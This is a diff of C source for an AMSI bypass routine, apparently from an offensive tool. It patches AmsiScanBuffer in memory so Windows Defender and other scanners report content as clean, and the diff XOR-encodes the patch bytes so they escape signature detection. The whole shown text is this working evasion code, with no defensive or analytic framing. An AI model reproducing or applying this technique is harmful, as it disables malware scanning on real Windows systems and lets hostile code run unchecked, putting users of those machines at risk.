@@ -2,15 +2,10 @@
 #include <windows.h>
 #include <string.h>
 
-/*
- * Patch AmsiScanBuffer to return 0x80070057 (E_INVALIDARG) immediately.
- * Windows Defender and other AMSI consumers treat this as a failed scan
- * and do not block execution — the buffer is considered CLEAN.
- *
- * Patch bytes (x86-64):
- *   B8 57 00 07 80   mov eax, 0x80070057
- *   C3               ret
- */
+static void xor_decode(unsigned char *buf, int len, unsigned char key) {
+    for (int i = 0; i < len; i++) buf[i] ^= key;
+}
+
 bool jocky_bypass_amsi(void) {
     HMODULE hAmsi = GetModuleHandleA("amsi.dll");
     if (!hAmsi) {
@@ -18,6 +13,11 @@ bool jocky_bypass_amsi(void) {
         if (!hAmsi)
             return true;  /* amsi.dll absent — nothing to bypass */
     }
+
+    /* Patch bytes encoded XOR 0x55: mov eax,0x80070057 ; ret
+     * Plaintext: B8 57 00 07 80 C3 — never appears literally in binary. */
+    unsigned char patch[] = {0xED, 0x02, 0x55, 0x52, 0xD5, 0x96};
+    xor_decode(patch, sizeof(patch), 0x55);
 
     FARPROC pScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
     if (!pScan)
@@ -27,14 +27,9 @@ bool jocky_bypass_amsi(void) {
     if (!VirtualProtect((LPVOID)pScan, 6, PAGE_EXECUTE_READWRITE, &old_protect))
         return false;
 
-    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
     memcpy((void*)pScan, patch, sizeof(patch));
     VirtualProtect((LPVOID)pScan, 6, old_protect, &old_protect);
 
-    /*
-     * Also patch AmsiOpenSession — if AMSI session creation fails, the
-     * scan is skipped entirely for that context (belt-and-suspenders).
-     */
     FARPROC pOpen = GetProcAddress(hAmsi, "AmsiOpenSession");
     if (pOpen) {
         DWORD op2;
